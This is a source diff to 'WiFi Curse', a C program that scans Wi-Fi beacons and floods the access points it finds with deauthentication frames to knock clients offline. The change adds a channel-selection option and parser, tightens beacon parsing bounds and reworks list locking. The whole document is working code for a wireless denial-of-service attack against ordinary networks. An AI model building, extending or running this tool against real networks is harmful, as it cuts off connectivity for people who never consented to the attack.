@@ -20,6 +20,7 @@
 #include <stdlib.h>
 #include <stdint.h>
 #include <string.h>
+#include <unistd.h>
 #include <poll.h>
 #include <signal.h>
 #include <pthread.h>
@@ -33,13 +34,13 @@
 #include "wificurse.h"
 
 
+#define ARRAY_SIZE(arr) (sizeof(arr) / sizeof(arr[0]))
+
 struct deauth_thread_args {
 	struct ap_list *apl;
 	struct iw_dev *dev;
 	pthread_mutex_t *chan_mutex;
 	pthread_mutex_t *list_mutex;
-	channelset_t *chans_fixed;
-	channelset_t *chans;
 	volatile int stop;
 };
 
@@ -66,7 +67,7 @@ int send_deauth(struct iw_dev *dev, struct access_point *ap) {
 	deauth->sc.sequence = ap->sequence++;
 	do {
 		r = iw_write(dev, deauth, sizeof(*deauth) + sizeof(*reason));
-	} while (r == ERRAGAIN);
+	} while (r == 0);
 	if (r < 0) {
 		free(deauth);
 		return r;
@@ -81,6 +82,7 @@ int read_ap_info(struct iw_dev *dev, struct ap_info *api) {
 	uint8_t buf[4096], *pkt;
 	size_t pkt_sz;
 	ssize_t r, tmp, n;
+	uintptr_t tmp_ip;
 	struct mgmt_frame *beacon;
 	struct beacon_frame_body *beacon_fb;
 	struct info_element *beacon_ie;
@@ -89,24 +91,35 @@ int read_ap_info(struct iw_dev *dev, struct ap_info *api) {
 	if (r < 0)
 		return r;
 
+	if (pkt_sz < sizeof(*beacon) + sizeof(*beacon_fb))
+		return ERRNODATA;
+
 	beacon = (struct mgmt_frame*)pkt;
 
 	/* if it's a beacon packet */
 	if (beacon->fc.subtype == FRAME_CONTROL_SUBTYPE_BEACON) {
 		memcpy(api->bssid, beacon->bssid, IFHWADDRLEN);
 		beacon_fb = (struct beacon_frame_body*)beacon->frame_body;
-		beacon_ie = beacon_fb->infos;
+		beacon_ie = (struct info_element*)beacon_fb->infos;
 		api->essid[0] = '\0';
 		n = 0;
 
 		/* parse beacon */
 		while (1) {
+			tmp_ip = (uintptr_t)beacon_ie + sizeof(*beacon_ie);
+			if (tmp_ip - (uintptr_t)buf >= r)
+				break;
+			tmp_ip += beacon_ie->len;
+			if (tmp_ip - (uintptr_t)buf > r)
+				break;
 			if (beacon_ie->id == INFO_ELEMENT_ID_SSID) { /* SSID found */
 				tmp = beacon_ie->len < ESSID_LEN ? beacon_ie->len : ESSID_LEN;
 				memcpy(api->essid, beacon_ie->info, tmp);
 				api->essid[tmp] = '\0';
 				n |= 1;
 			} else if (beacon_ie->id == INFO_ELEMENT_ID_DS) { /* channel number found */
+				if (beacon_ie->len != 1)
+					break;
 				api->chan = beacon_ie->info[0];
 				n |= 2;
 			}
@@ -114,15 +127,12 @@ int read_ap_info(struct iw_dev *dev, struct ap_info *api) {
 				break;
 			/* next beacon element */
 			beacon_ie = (struct info_element*)&beacon_ie->info[beacon_ie->len];
-			if ((uintptr_t)beacon_ie - (uintptr_t)buf >= r)
-				break;
 		}
 
 		/* if we didn't found the channel number
-		 * or if the channel number is not in interference range
 		 * then return ERRNODATA
 		 */
-		if (!(n & 2) || api->chan < dev->chan-2 || api->chan > dev->chan+2)
+		if (!(n & 2))
 			return ERRNODATA;
 
 		return 0;
@@ -134,7 +144,7 @@ int read_ap_info(struct iw_dev *dev, struct ap_info *api) {
 void *deauth_thread_func(void *arg) {
 	struct deauth_thread_args *ta = arg;
 	struct access_point *ap, *tmp;
-	int i, j, b, tmp_chan;
+	int i, j, b;
 
 	while (!ta->stop) {
 		pthread_mutex_lock(ta->chan_mutex);
@@ -144,29 +154,16 @@ void *deauth_thread_func(void *arg) {
 				ap = ta->apl->head;
 				while (ap != NULL && !ta->stop) {
 					/* if the last beacon we got was 3 mins ago, remove AP */
+					pthread_mutex_lock(ta->list_mutex);
 					if (time(NULL) - ap->last_beacon_tm >= 3*60) {
-						tmp_chan = ap->info.chan;
 						tmp = ap;
 						ap = ap->next;
-						pthread_mutex_lock(ta->list_mutex);
 						unlink_ap(ta->apl, tmp);
 						free(tmp);
-						/* if AP channel is not in chans_fixed and there isn't any
-						 * other AP that use this channel, remove it from chans.
-						 */
-						if (!channel_isset(ta->chans_fixed, tmp_chan)) {
-							tmp = ta->apl->head;
-							while (tmp != NULL) {
-								if (tmp->info.chan == tmp_chan)
-									break;
-								tmp = tmp->next;
-							}
-							if (tmp == NULL)
-								channel_unset(ta->chans, tmp_chan);
-						}
 						pthread_mutex_unlock(ta->list_mutex);
 						continue;
 					}
+					pthread_mutex_unlock(ta->list_mutex);
 					/* if interface and AP are in the same channel, send deauth */
 					if (ap->info.chan == ta->dev->chan) {
 						if (send_deauth(ta->dev, ap) < 0) {
@@ -194,6 +191,70 @@ void *deauth_thread_func(void *arg) {
 	return NULL;
 }
 
+static void print_usage(FILE *f) {
+	fprintf(f, "\n  WiFi Curse v" VERSION " (C) 2012  oblique\n\n");
+	fprintf(f, "  usage: wificurse [options] <interface>\n\n");
+	fprintf(f, "  Options:\n");
+	fprintf(f, "    -c channels      Channel list (e.g 1,4-6,11) (default: 1-14)\n");
+	fprintf(f, "\n");
+}
+
+static int parse_chans_str(char *chans_str, channelset_t *chans) {
+	char *s, *str, *ptrs[256] = { NULL };
+	int i, j, n, chan1, chan2;
+
+	channel_zero(chans);
+
+	str = strtok_r(chans_str, ",", &s);
+	ptrs[0] = str;
+	n = 1;
+	while (n < ARRAY_SIZE(ptrs)-1) {
+		str = strtok_r(NULL, ",", &s);
+		if (str == NULL)
+			break;
+		ptrs[n++] = str;
+	}
+
+	i = 0;
+	while (ptrs[i] != NULL) {
+		if (ptrs[i][0] == '-')
+			return -1;
+		n = 0;
+		for (j = 0; ptrs[i][j] != '\0'; j++) {
+			if (ptrs[i][j] == '-') {
+				if (ptrs[i][j+1] == '\0')
+					return -1;
+				n++;
+				if (n > 1)
+					return -1;
+			} else if (ptrs[i][j] < '0' || ptrs[i][j] > '9')
+				return -1;
+		}
+
+		str = strtok_r(ptrs[i], "-", &s);
+		chan1 = atoi(str);
+		if (chan1 == 0)
+			return -1;
+
+		if (s[0] == '\0')
+			chan2 = chan1;
+		else
+			chan2 = atoi(s);
+
+		if (chan1 >= 256 || chan2 >= 256)
+			return -1;
+
+		if (chan1 > chan2)
+			return -1;
+
+		for (j = chan1; j <= chan2; j++)
+			channel_set(chans, j);
+		i++;
+	}
+
+	return 0;
+}
+
 int main(int argc, char *argv[]) {
 	struct ap_list apl;
 	struct ap_info api;
@@ -204,20 +265,55 @@ int main(int argc, char *argv[]) {
 	suseconds_t msec;
 	pthread_t deauth_thread;
 	pthread_mutex_t chan_mutex, list_mutex;
-	channelset_t chans_fixed, chans;
-	int ret, sigfd, n, chan;
+	channelset_t chans;
+	int ret, sigfd, c, n, chan;
+	char *ifname, *chans_str;
 	sigset_t exit_sig;
 	time_t tm;
 
-	if (argc != 2) {
-		fprintf(stderr, "\n  WiFi Curse v" VERSION " (C) 2012  oblique\n\n");
-		fprintf(stderr, "  usage: wificurse <interface>\n\n");
+	if (argc < 2) {
+		print_usage(stderr);
+		return EXIT_FAILURE;
+	}
+
+	/* arguments */
+	ifname = argv[argc-1];
+	chans_str = NULL;
+
+	while((c = getopt(argc, argv, "c:h")) != -1) {
+		switch (c) {
+		case 'c':
+			chans_str = optarg;
+			break;
+		case 'h':
+			print_usage(stdout);
+			return EXIT_SUCCESS;
+		case '?':
+		default:
+			return EXIT_FAILURE;
+		}
+	}
+
+	if (argv[optind] != ifname) {
+		print_usage(stderr);
 		return EXIT_FAILURE;
 	}
 
 	if (getuid()) {
 		fprintf(stderr, "Not root?\n");
 		return EXIT_FAILURE;
+	}
+
+	/* init channel set */
+	if (chans_str == NULL) {
+		channel_zero(&chans);
+		for (n=1; n<=14; n++)
+			channel_set(&chans, n);
+	} else {
+		if (parse_chans_str(chans_str, &chans) == -1) {
+			fprintf(stderr, "Can not parse the channels\n");
+			return EXIT_FAILURE;
+		}
 	}
 
 	/* init access point list */
@@ -245,7 +341,7 @@ int main(int argc, char *argv[]) {
 
 	/* init device */
 	iw_init_dev(&dev);
-	strncpy(dev.ifname, argv[1], sizeof(dev.ifname)-1);
+	strncpy(dev.ifname, ifname, sizeof(dev.ifname)-1);
 
 	if (iw_open(&dev) < 0) {
 		print_error();
@@ -255,12 +351,6 @@ int main(int argc, char *argv[]) {
 	pfd[1].fd = dev.fd_in;
 	pfd[1].revents = 0;
 	pfd[1].events = POLLIN;
-
-	/* init channel set */
-	channel_zero(&chans_fixed);
-	for (n=1; n<=14; n++)
-		channel_set(&chans_fixed, n);
-	channel_copy(&chans, &chans_fixed);
 
 	/* set channel */
 	n = 0;
@@ -282,8 +372,6 @@ int main(int argc, char *argv[]) {
 	ta.stop = 0;
 	ta.apl = &apl;
 	ta.dev = &dev;
-	ta.chans_fixed = &chans_fixed;
-	ta.chans = &chans;
 	pthread_mutex_init(&chan_mutex, NULL);
 	ta.chan_mutex = &chan_mutex;
 	pthread_mutex_init(&list_mutex, NULL);
@@ -312,8 +400,7 @@ int main(int argc, char *argv[]) {
 			if (ret < 0 && ret != ERRNODATA) { /* error */
 				print_error();
 				goto _errout;
-			} else if (ret == 0) { /* got infos */
-				channel_set(&chans, api.chan);
+			} else if (ret == 0 && channel_isset(&chans, api.chan)) { /* got infos */
 				pthread_mutex_lock(&list_mutex);
 				if (add_or_update_ap(&apl, &api) < 0) {
 					pthread_mutex_unlock(&list_mutex);
